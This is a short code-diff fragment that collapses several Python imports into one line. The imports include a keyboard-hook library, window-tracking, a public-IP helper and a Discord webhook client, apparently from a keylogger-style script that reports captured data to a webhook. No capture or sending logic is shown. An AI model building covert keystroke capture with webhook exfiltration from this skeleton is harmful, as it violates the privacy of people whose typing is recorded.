@@ -1,9 +1,4 @@
-import os
-import pyxhook
-import socket
-import time
-import pywinctl
-import requests
+import os, pyxhook, socket, time, pywinctl, requests
 from discord_webhook import DiscordWebhook
 
 def get_public_ip():
